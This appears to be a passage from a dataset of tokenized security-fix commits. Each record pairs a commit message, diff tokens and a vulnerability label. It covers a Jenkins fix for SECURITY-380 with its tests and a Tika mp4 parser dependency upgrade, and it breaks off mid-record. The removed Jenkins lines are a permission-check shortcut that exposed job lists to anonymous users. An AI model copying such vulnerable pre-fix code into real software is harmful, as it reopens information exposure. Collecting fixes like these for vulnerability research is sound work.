["arbitrary", "file", "write"]}
{"contents": ["Merge", "pull", "request", "#86", "from", "jenkinsci-cert/SECURITY-380", "[FIX", "SECURITY-380]", "Don't", "optimize", "permission", "check", "in", "getItems()"], "code_tokens": ["@", "@", "-", "136", ",", "7", "+", "136", ",", "6", "@", "@", "import", "hudson", ".", "security", ".", "AuthorizationStrategy", ";", "import", "hudson", ".", "security", ".", "BasicAuthenticationFilter", ";", "import", "hudson", ".", "security", ".", "FederatedLoginService", ";", "import", "hudson", ".", "security", ".", "FullControlOnceLoggedInAuthorizationStrategy", ";", "import", "hudson", ".", "security", ".", "HudsonFilter", ";", "import", "hudson", ".", "security", ".", "LegacyAuthorizationStrategy", ";", "import", "hudson", ".", "security", ".", "LegacySecurityRealm", ";", "@", "@", "-", "1479", ",", "11", "+", "1478", ",", "6", "@", "@", "public", "String", "getFullDisplayName", "(", ")", "{", "*", "/", "@", "Exported", "(", "name", "=", "\"", "jobs", "\"", ")", "public", "List", "<", "TopLevelItem", ">", "getItems", "(", ")", "{", "if", "(", "authorizationStrategy", "instanceof", "AuthorizationStrategy", ".", "Unsecured", "|", "|", "authorizationStrategy", "instanceof", "FullControlOnceLoggedInAuthorizationStrategy", ")", "{", "return", "new", "ArrayList", "(", "items", ".", "values", "(", "))", ";", "}", "List", "<", "TopLevelItem", ">", "viewableItems", "=", "new", "ArrayList", "<", "TopLevelItem", ">", "()", ";", "for", "(", "TopLevelItem", "item", ":", "items", ".", "values", "(", "))", "{", "if", "(", "item", ".", "hasPermission", "(", "Item", ".", "READ", ")", ")", "@", "@", "-", "0", ",", "0", "+", "1", ",", "95", "@", "@", "package", "jenkins", ".", "security", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "Page", ";", "import", "hudson", ".", "model", ".", "UnprotectedRootAction", ";", "import", "hudson", ".", "security", ".", "ACL", ";", "import", "hudson", ".", "security", ".", "FullControlOnceLoggedInAuthorizationStrategy", ";", "import", "hudson", ".", "util", ".", "HttpResponses", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "org", ".", "junit", ".", "Assert", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "Issue", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "JenkinsRule", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "TestExtension", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "HttpResponse", ";", "public", "class", "Security380Test", "{", "@", "Rule", "public", "JenkinsRule", "j", "=", "new", "JenkinsRule", "(", ");", "@", "Issue", "(", "\"", "SECURITY", "-", "380", "\"", ")", "@", "Test", "public", "void", "testGetItemsWithoutAnonRead", "(", ")", "throws", "Exception", "{", "FullControlOnceLoggedInAuthorizationStrategy", "strategy", "=", "new", "FullControlOnceLoggedInAuthorizationStrategy", "(", ");", "strategy", ".", "setAllowAnonymousRead", "(", "false", ")", ";", "Jenkins", ".", "getInstance", "(", ").", "setAuthorizationStrategy", "(", "strategy", ")", ";", "Jenkins", ".", "getInstance", "(", ").", "setSecurityRealm", "(", "j", ".", "createDummySecurityRealm", "(", "))", ";", "j", ".", "createFreeStyleProject", "(", ");", "ACL", ".", "impersonate", "(", "Jenkins", ".", "ANONYMOUS", ",", "new", "Runnable", "(", ")", "{", "@", "Override", "public", "void", "run", "(", ")", "{", "Assert", ".", "assertEquals", "(", "\"", "no", "items", "\"", ",", "0", ",", "Jenkins", ".", "getInstance", "(", ").", "getItems", "(", ").", "size", "(", "))", ";", "}", "}", ");", "}", "@", "Issue", "(", "\"", "SECURITY", "-", "380", "\"", ")", "@", "Test", "public", "void", "testGetItems", "(", ")", "throws", "Exception", "{", "FullControlOnceLoggedInAuthorizationStrategy", "strategy", "=", "new", "FullControlOnceLoggedInAuthorizationStrategy", "(", ");", "strategy", ".", "setAllowAnonymousRead", "(", "true", ")", ";", "Jenkins", ".", "getInstance", "(", ").", "setAuthorizationStrategy", "(", "strategy", ")", ";", "Jenkins", ".", "getInstance", "(", ").", "setSecurityRealm", "(", "j", ".", "createDummySecurityRealm", "(", "))", ";", "j", ".", "createFreeStyleProject", "(", ");", "ACL", ".", "impersonate", "(", "Jenkins", ".", "ANONYMOUS", ",", "new", "Runnable", "(", ")", "{", "@", "Override", "public", "void", "run", "(", ")", "{", "Assert", ".", "assertEquals", "(", "\"", "one", "item", "\"", ",", "1", ",", "Jenkins", ".", "getInstance", "(", ").", "getItems", "(", ").", "size", "(", "))", ";", "}", "}", ");", "}", "@", "Issue", "(", "\"", "SECURITY", "-", "380", "\"", ")", "@", "Test", "public", "void", "testWithUnprotectedRootAction", "(", ")", "throws", "Exception", "{", "FullControlOnceLoggedInAuthorizationStrategy", "strategy", "=", "new", "FullControlOnceLoggedInAuthorizationStrategy", "(", ");", "strategy", ".", "setAllowAnonymousRead", "(", "false", ")", ";", "Jenkins", ".", "getInstance", "(", ").", "setAuthorizationStrategy", "(", "strategy", ")", ";", "Jenkins", ".", "getInstance", "(", ").", "setSecurityRealm", "(", "j", ".", "createDummySecurityRealm", "(", "))", ";", "j", ".", "createFreeStyleProject", "(", ");", "JenkinsRule", ".", "WebClient", "wc", "=", "j", ".", "createWebClient", "(", ");", "Page", "page", "=", "wc", ".", "goTo", "(", "\"", "listJobs", "\"", ",", "\"", "text", "/", "plain", "\"", ");", "Assert", ".", "assertEquals", "(", "\"", "expect", "0", "items", "\"", ",", "\"", "0", "\"", ",", "page", ".", "getWebResponse", "(", ").", "getContentAsString", "(", ").", "trim", "(", "))", ";", "}", "@", "TestExtension", "public", "static", "class", "JobListingUnprotectedRootAction", "implements", "UnprotectedRootAction", "{", "@", "Override", "public", "String", "getIconFileName", "(", ")", "{", "return", "null", ";", "}", "@", "Override", "public", "String", "getDisplayName", "(", ")", "{", "return", "null", ";", "}", "@", "Override", "public", "String", "getUrlName", "(", ")", "{", "return", "\"", "listJobs", "\"", ";", "}", "public", "HttpResponse", "doIndex", "(", ")", "throws", "Exception", "{", "return", "HttpResponses", ".", "plainText", "(", "Integer", ".", "toString", "(", "Jenkins", ".", "getInstance", "(", ").", "getItems", "(", ").", "size", "(", "))", ");", "}", "}", "}"], "docstring_tokens": ["information", "exposure"]}
{"contents": ["TIKA-3084", "--", "upgrade", "mp4", "parser", "dependency"], "code_tokens": ["@", "@", "-", "322", ",", "9", "+", "322", ",", "9", "@", "@", "<", "version", ">", "8", ".", "0", ".", "1", "<", "/", "version", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "com", ".", "googlecode", ".", "mp4parser", "<", "/", "groupId", ">", "<", "groupId", ">", "org", ".", "tallison", "<", "/", "groupId", ">", "<", "artifactId", ">", "isoparser", "<", "/", "artifactId", ">", "<", "version", ">", "1", ".", "1", ".", "22", "<", "/", "version", ">", "<", "version", ">", "1", ".", "9", ".", "41", ".", "2", "<", "/", "version", ">", "<", "/", "dependency", ">", "<", "!-", "-", "this", "is", "a", "fork", "of", "com", ".", "drewnoakes", "metadata", "extractor", "that", "shade", "/", "relocates", "com", ".", "adobe", ".", "internal", "@", "@", "-", "1", ",", "127", "+", "0", ",", "0", "@", "@", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "tika", ".", "parser", ".", "mp4", ";", "import", "static", "com", ".", "googlecode", ".", "mp4parser", ".", "util", ".", "CastUtils", ".", "l2i", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "RandomAccessFile", ";", "import", "java", ".", "math", ".", "BigInteger", ";", "import", "java", ".", "nio", ".", "ByteBuffer", ";", "import", "java", ".", "nio", ".", "channels", ".", "WritableByteChannel", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "DataSource", ";", "/", "**", "*", "A", "{", "@", "link", "DataSource", "}", "implementation", "that", "relies", "on", "direct", "reads", "from", "a", "{", "@", "link", "RandomAccessFile", "}", ".", "*", "It", "should", "be", "slower", "than", "{", "@", "link", "com", ".", "googlecode", ".", "mp4parser", ".", "FileDataSourceImpl", "}", "but", "does", "not", "incur", "the", "implicit", "file", "locks", "of", "*", "memory", "mapped", "I", "/", "O", "on", "some", "JVMs", ".", "This", "implementation", "allows", "for", "a", "more", "controlled", "deletion", "of", "files", "*", "and", "might", "be", "preferred", "when", "working", "with", "temporary", "files", ".", "*", "@", "see", "<", "a", "href", "=", "\"", "http", ":", "//", "bugs", ".", "java", ".", "com", "/", "view_bug", ".", "do", "?", "bug_id", "=", "4724038", "\"", ">", "JDK", "-", "4724038", ":", "(", "fs", ")", "Add", "unmap", "method", "to", "MappedByteBuffer", "<", "/", "a", ">", "*", "@", "see", "<", "a", "href", "=", "\"", "http", ":", "//", "bugs", ".", "java", ".", "com", "/", "view_bug", ".", "do", "?", "bug_id", "=", "6359560", "\"", ">", "JDK", "-", "6359560", ":", "(", "fs", ")", "File", ".", "deleteOnExit", "(", ")", "doesn", "'", "t", "work", "when", "MappedByteBuffer", "exists", "(", "win", ")", "</", "a", ">", "*", "/", "public", "class", "DirectFileReadDataSource", "implements", "DataSource", "{", "private", "static", "final", "int", "TRANSFER_SIZE", "=", "8192", ";", "private", "RandomAccessFile", "raf", ";", "public", "DirectFileReadDataSource", "(", "File", "f", ")", "throws", "IOException", "{", "this", ".", "raf", "=", "new", "RandomAccessFile", "(", "f", ",", "\"", "r", "\"", ");", "}", "public", "int", "read", "(", "ByteBuffer", "byteBuffer", ")", "throws", "IOException", "{", "int", "len", "=", "byteBuffer", ".", "remaining", "(", ");", "int", "totalRead", "=", "0", ";", "int", "bytesRead", "=", "0", ";", "byte", "[", "]", "buf", "=", "new", "byte", "[", "TRANSFER_SIZE", "]", ";", "while", "(", "totalRead", "<", "len", ")", "{", "int", "bytesToRead", "=", "Math", ".", "min", "(", "(", "len", "-", "totalRead", ")", ",", "TRANSFER_SIZE", ")", ";", "bytesRead", "=", "raf", ".", "read", "(", "buf", ",", "0", ",", "bytesToRead", ")", ";", "if", "(", "bytesRead", "<", "0", ")", "{", "break", ";", "}", "else", "{", "totalRead", "+", "=", "bytesRead", ";", "}", "byteBuffer", ".", "put", "(", "buf", ",", "0", ",", "bytesRead", ")", ";", "}", "if", "(", "bytesRead", "<", "0", "&", "&", "position", "(", ")", "=", "=", "size", "(", ")", "&", "&", "byteBuffer", ".", "hasRemaining", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "End", "of", "stream", "reached", "earlier", "than", "expected", "\"", ");", "}", "return", "(", "(", "bytesRead", "<", "0", ")", "&", "&", "(", "totalRead", "=", "=", "0", ")", ")", "?", "-", "1", ":", "totalRead", ";", "}", "public", "int", "readAllInOnce", "(", "ByteBuffer", "byteBuffer", ")", "throws", "IOException", "{", "if", "(", "byteBuffer", ".", "remaining", "(", ")", ">", "raf", ".", "length", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "trying", "to", "readAllInOnce", "past", "end", "of", "stream", "\"", ");", "}", "byte", "[", "]", "buf", "=", "new", "byte", "[", "byteBuffer", ".", "remaining", "(", ")]", ";", "int", "read", "=", "raf", ".", "read", "(", "buf", ")", ";", "byteBuffer", ".", "put", "(", "buf", ",", "0", ",", "read", ")", ";", "return", "read", ";", "}", "public", "long", "size", "(", ")", "throws", "IOException", "{", "return", "raf", ".", "length", "(", ");", "}", "public", "long", "position", "(", ")", "throws", "IOException", "{", "return", "raf", ".", "getFilePointer", "(", ");", "}", "public", "void", "position", "(", "long", "nuPos", ")", "throws", "IOException", "{", "if", "(", "nuPos", ">", "raf", ".", "length", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "requesting", "seek", "past", "end", "of", "stream", "\"", ");", "}", "raf", ".", "seek", "(", "nuPos", ")", ";", "}", "public", "long", "transferTo", "(", "long", "position", ",", "long", "count", ",", "WritableByteChannel", "target", ")", "throws", "IOException", "{", "return", "target", ".", "write", "(", "map", "(", "position", ",", "count", ")", ");", "}", "public", "ByteBuffer", "map", "(", "long", "startPosition", ",", "long", "size", ")", "throws", "IOException", "{", "if", "(", "startPosition", "<", "0", "|", "|", "size", "<", "0", ")", "{", "throw", "new", "IOException", "(", "\"", "startPosition", "and", "size", "must", "both", "be", ">", "=", "0", "\"", ");", "}", "/", "/", "make", "sure", "that", "start", "+", "size", "aren", "'", "t", "greater", "than", "avail", "size", "/", "/", "in", "raf", ".", "BigInteger", "end", "=", "BigInteger", ".", "valueOf", "(", "startPosition", ")", ";", "end", "=", "end", ".", "add", "(", "BigInteger", ".", "valueOf", "(", "size", ")", ");", "if", "(", "end", ".", "compareTo", "(", "BigInteger", ".", "valueOf", "(", "raf", ".", "length", "(", "))", ")", ">", "0", ")", "{", "throw", "new", "IOException", "(", "\"", "requesting", "read", "past", "end", "of", "stream", "\"", ");", "}", "raf", ".", "seek", "(", "startPosition", ")", ";", "int", "payLoadSize", "=", "l2i", "(", "size", ")", ";", "/", "/", "hack", "to", "check", "for", "potential", "overflow", "if", "(", "Long", ".", "MAX_VALUE", "-", "payLoadSize", "<", "startPosition", "|", "|", "Long", ".", "MAX_VALUE", "-", "payLoadSize", ">", "raf", ".", "length", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "requesting", "read", "past", "end", "of", "stream", "\"", ");", "}", "byte", "[", "]", "payload", "=", "new", "byte", "[", "payLoadSize", "]", ";", "raf", ".", "readFully", "(", "payload", ")", ";", "return", "ByteBuffer", ".", "wrap", "(", "payload", ")", ";", "}", "@", "Override", "public", "void", "close", "(", ")", "throws", "IOException", "{", "raf", ".", "close", "(", ");", "}", "}", "\\", "No", "newline", "at", "end", "of", "file", "@", "@", "-", "16", ",", "36", "+", "16", ",", "7", "@", "@", "*", "/", "package", "org", ".", "apache", ".", "tika", ".", "parser", ".", "mp4", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "IsoFile", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "Box", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "Container", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "FileTypeBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "MetaBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "MovieBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "MovieHeaderBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "SampleDescriptionBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "SampleTableBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "TrackBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "TrackHeaderBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "UserDataBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "apple", ".", "AppleItemListBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "sampleentry", ".", "AudioSampleEntry", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "DataSource", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleAlbumBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleArtist2Box", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleArtistBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleCommentBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleCompilationBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleDiskNumberBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleEncoderBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleGPSCoordinatesBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleGenreBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleNameBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleRecordingYear2Box", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleTrackAuthorBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleTrackNumberBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "Utf8AppleDataBox", ";", "import", "org", ".", "apache", ".", "tika", ".", "config", ".", "Field", ";", "import", "org", ".", "apache", ".", "tika", ".", "exception", ".", "TikaException", ";", "import", "org", ".", "apache", ".", "tika", ".", "io", ".", "TemporaryResources", ";", "import", "org", ".", "apache", ".", "tika", ".", "io", ".", "TikaInputStream", ";", "@", "@", "-", "58", ",", "6", "+", "29", ",", "34", "@", "@", "import", "org", ".", "apache", ".", "tika", ".", "parser", ".", "AbstractParser", ";", "import", "org", ".", "apache", ".", "tika", ".", "parser", ".", "ParseContext", ";", "import", "org", ".", "apache", ".", "tika", ".", "sax", ".", "XHTMLContentHandler", ";", "import", "org", ".", "mp4parser", ".", "Box", ";", "import", "org", ".", "mp4parser", ".", "Container", ";", "import", "org", ".", "mp4parser", ".", "IsoFile", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleAlbumBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleArtist2Box", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleArtistBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleCommentBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleCompilationBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleDiskNumberBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleEncoderBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleGPSCoordinatesBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleGenreBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleItemListBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleNameBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleRecordingYear2Box", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleTrackAuthorBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleTrackNumberBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "Utf8AppleDataBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "FileTypeBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "MetaBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "MovieBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "MovieHeaderBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "SampleDescriptionBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "SampleTableBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "TrackBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "TrackHeaderBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "iso14496", ".", "part12", ".", "UserDataBox", ";", "import", "org", ".", "mp4parser", ".", "boxes", ".", "sampleentry", ".", "AudioSampleEntry", ";", "import", "org", ".", "xml", ".", "sax", ".", "ContentHandler", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXException", ";", "@", "@", "-", "103", ",", "7", "+", "102", ",", "7", "@", "@", "\"", "mp41", "\"", ",", "\"", "mp42", "\"", "))", ";", "typesMap", ".", "put", "(", "MediaType", ".", "video", "(", "\"", "x", "-", "m4v", "\"", "),", "Arrays", ".", "asList", "(", "\"", "M4V", "\"", ",", "\"", "M4VH", "\"", ",", "\"", "M4VP", "\"", "))", ";", "typesMap", ".", "put", "(", "MediaType", ".", "video", "(", "\"", "quicktime", "\"", "),", "Collections", ".", "<", "String", ">", "emptyList", "(", "))", ";", "typesMap", ".", "put", "(", "MediaType", ".", "application", "(", "\"", "mp4", "\"", "),", "Collections", ".", "<", "String", ">", "emptyList", "(", "))", ";", "}", "@", "@", "-", "117", ",", "7", "+", "116", ",", "6", "@", "@", "return", "SUPPORTED_TYPES", ";", "}", "public", "void", "parse", "(", "InputStream", "stream", ",", "ContentHandler", "handler", ",", "Metadata", "metadata", ",", "ParseContext", "context", ")", "@", "@", "-", "129", ",", "186", "+", "127", ",", "209", "@", "@", "public", "void", "parse", "(", "TemporaryResources", "tmp", "=", "new", "TemporaryResources", "(", ");", "TikaInputStream", "tstream", "=", "TikaInputStream", ".", "get", "(", "stream", ",", "tmp", ")", ";", "try", "(", "DataSource", "dataSource", "=", "new", "DirectFileReadDataSource", "(", "tstream", ".", "getFile", "(", "))", ")", "{", "try", "(", "IsoFile", "isoFile", "=", "new", "IsoFile", "(", "dataSource", ")", ")", "{", "tmp", ".", "addResource", "(", "isoFile", ")", ";", "/", "/", "Grab", "the", "file", "type", "box", "FileTypeBox", "fileType", "=", "getOrNull", "(", "isoFile", ",", "FileTypeBox", ".", "class", ")", ";", "if", "(", "fileType", "!", "=", "null", ")", "{", "/", "/", "Identify", "the", "type", "MediaType", "type", "=", "MediaType", ".", "application", "(", "\"", "mp4", "\"", ");", "for", "(", "Map", ".", "Entry", "<", "MediaType", ",", "List", "<", "String", ">", ">", "e", ":", "typesMap", ".", "entrySet", "(", "))", "{", "if", "(", "e", ".", "getValue", "(", ").", "contains", "(", "fileType", ".", "getMajorBrand", "(", "))", ")", "{", "type", "=", "e", ".", "getKey", "(", ");", "break", ";", "}", "try", "(", "IsoFile", "isoFile", "=", "new", "IsoFile", "(", "tstream", ".", "getFile", "(", "))", ")", "{", "tmp", ".", "addResource", "(", "isoFile", ")", ";", "/", "/", "Grab", "the", "file", "type", "box", "FileTypeBox", "fileType", "=", "getOrNull", "(", "isoFile", ",", "FileTypeBox", ".", "class", ")", ";", "if", "(", "fileType", "!", "=", "null", ")", "{", "/", "/", "Identify", "the", "type", "MediaType", "type", "=", "MediaType", ".", "application", "(", "\"", "mp4", "\"", ");", "for", "(", "Map", ".", "Entry", "<", "MediaType", ",", "List", "<", "String", ">", ">", "e", ":", "typesMap", ".", "entrySet", "(", "))", "{", "if", "(", "e", ".", "getValue", "(", ").", "contains", "(", "fileType", ".", "getMajorBrand", "(", "))", ")", "{", "type", "=", "e", ".", "getKey", "(", ");", "break", ";", "}", "metadata", ".", "set", "(", "Metadata", ".", "CONTENT_TYPE", ",", "type", ".", "toString", "(", "))", ";", "}", "metadata", ".", "set", "(", "Metadata", ".", "CONTENT_TYPE", ",", "type", ".", "toString", "(", "))", ";", "if", "(", "type", ".", "getType", "(", ").", "equals", "(", "\"", "audio", "\"", "))", "{", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_COMPRESSOR", ",", "fileType", ".", "getMajorBrand", "(", ").", "trim", "(", "))", ";", "}", "}", "else", "{", "/", "/", "Some", "older", "QuickTime", "files", "lack", "the", "FileType", "metadata", ".", "set", "(", "Metadata", ".", "CONTENT_TYPE", ",", "\"", "video", "/", "quicktime", "\"", ");", "if", "(", "type", ".", "getType", "(", ").", "equals", "(", "\"", "audio", "\"", "))", "{", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_COMPRESSOR", ",", "fileType", ".", "getMajorBrand", "(", ").", "trim", "(", "))", ";", "}", "}", "else", "{", "/", "/", "Some", "older", "QuickTime", "files", "lack", "the", "FileType", "metadata", ".", "set", "(", "Metadata", ".", "CONTENT_TYPE", ",", "\"", "video", "/", "quicktime", "\"", ");", "}", "/", "/", "Get", "the", "main", "MOOV", "box", "MovieBox", "moov", "=", "getOrNull", "(", "isoFile", ",", "MovieBox", ".", "class", ")", ";", "if", "(", "moov", "=", "=", "null", ")", "{", "/", "/", "Bail", "out", "return", ";", "}", "/", "/", "Get", "the", "main", "MOOV", "box", "MovieBox", "moov", "=", "getOrNull", "(", "isoFile", ",", "MovieBox", ".", "class", ")", ";", "if", "(", "moov", "=", "=", "null", ")", "{", "/", "/", "Bail", "out", "return", ";", "}", "XHTMLContentHandler", "xhtml", "=", "new", "XHTMLContentHandler", "(", "handler", ",", "metadata", ")", ";", "xhtml", ".", "startDocument", "(", ");", "XHTMLContentHandler", "xhtml", "=", "new", "XHTMLContentHandler", "(", "handler", ",", "metadata", ")", ";", "xhtml", ".", "startDocument", "(", ");", "handleMovieHeaderBox", "(", "moov", ",", "metadata", ",", "xhtml", ")", ";", "handleTrackBoxes", "(", "moov", ",", "metadata", ",", "xhtml", ")", ";", "/", "/", "Pull", "out", "some", "information", "from", "the", "header", "box", "MovieHeaderBox", "mHeader", "=", "getOrNull", "(", "moov", ",", "MovieHeaderBox", ".", "class", ")", ";", "if", "(", "mHeader", "!", "=", "null", ")", "{", "/", "/", "Get", "the", "creation", "and", "modification", "dates", "metadata", ".", "set", "(", "Metadata", ".", "CREATION_DATE", ",", "mHeader", ".", "getCreationTime", "(", "))", ";", "metadata", ".", "set", "(", "TikaCoreProperties", ".", "MODIFIED", ",", "mHeader", ".", "getModificationTime", "(", "))", ";", "/", "/", "Get", "metadata", "from", "the", "User", "Data", "Box", "UserDataBox", "userData", "=", "getOrNull", "(", "moov", ",", "UserDataBox", ".", "class", ")", ";", "if", "(", "userData", "!", "=", "null", ")", "{", "extractGPS", "(", "userData", ",", "metadata", ")", ";", "MetaBox", "metaBox", "=", "getOrNull", "(", "userData", ",", "MetaBox", ".", "class", ")", ";", "/", "/", "Get", "the", "duration", "double", "durationSeconds", "=", "(", "(", "double", ")", "mHeader", ".", "getDuration", "(", "))", "/", "mHeader", ".", "getTimescale", "(", ");", "metadata", ".", "set", "(", "XMPDM", ".", "DURATION", ",", "DURATION_FORMAT", ".", "format", "(", "durationSeconds", ")", ");", "/", "/", "Check", "for", "iTunes", "Metadata", "/", "/", "See", "http", ":", "//", "atomicparsley", ".", "sourceforge", ".", "net", "/", "mpeg", "-", "4files", ".", "html", "and", "/", "/", "http", ":", "//", "code", ".", "google", ".", "com", "/", "p", "/", "mp4v2", "/", "wiki", "/", "iTunesMetadata", "for", "more", "on", "these", "handleApple", "(", "metaBox", ",", "metadata", ",", "xhtml", ")", ";", "/", "/", "TODO", "Check", "for", "other", "kinds", "too", "}", "/", "/", "The", "timescale", "is", "normally", "the", "sampling", "rate", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_SAMPLE_RATE", ",", "(", "int", ")", "mHeader", ".", "getTimescale", "(", "))", ";", "}", "/", "/", "All", "done", "xhtml", ".", "endDocument", "(", ");", "}", "finally", "{", "tmp", ".", "dispose", "(", ");", "}", "/", "/", "Get", "some", "more", "information", "from", "the", "track", "header", "/", "/", "TODO", "Decide", "how", "to", "handle", "multiple", "tracks", "List", "<", "TrackBox", ">", "tb", "=", "moov", ".", "getBoxes", "(", "TrackBox", ".", "class", ")", ";", "if", "(", "tb", ".", "size", "(", ")", ">", "0", ")", "{", "TrackBox", "track", "=", "tb", ".", "get", "(", "0", ")", ";", "TrackHeaderBox", "header", "=", "track", ".", "getTrackHeaderBox", "(", ");", "/", "/", "Get", "the", "creation", "and", "modification", "dates", "metadata", ".", "set", "(", "TikaCoreProperties", ".", "CREATED", ",", "header", ".", "getCreationTime", "(", "))", ";", "metadata", ".", "set", "(", "TikaCoreProperties", ".", "MODIFIED", ",", "header", ".", "getModificationTime", "(", "))", ";", "/", "/", "Get", "the", "video", "with", "and", "height", "metadata", ".", "set", "(", "Metadata", ".", "IMAGE_WIDTH", ",", "(", "int", ")", "header", ".", "getWidth", "(", "))", ";", "metadata", ".", "set", "(", "Metadata", ".", "IMAGE_LENGTH", ",", "(", "int", ")", "header", ".", "getHeight", "(", "))", ";", "/", "/", "Get", "the", "sample", "information", "SampleTableBox", "samples", "=", "track", ".", "getSampleTableBox", "(", 